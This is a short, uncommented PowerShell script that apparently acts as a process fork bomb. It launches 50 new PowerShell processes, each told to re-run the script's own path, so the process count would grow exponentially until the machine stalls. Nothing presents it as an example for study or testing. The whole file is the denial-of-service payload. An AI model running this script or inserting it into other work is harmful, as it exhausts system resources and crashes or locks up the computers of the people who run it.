$max = 50
$count = 0

while ($count -lt $max) {
    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoLogo", "-NoProfile", "-Command & { . $MyInvocation.MyCommand.Path }"
    $count++
    Start-Sleep -Milliseconds 300
}
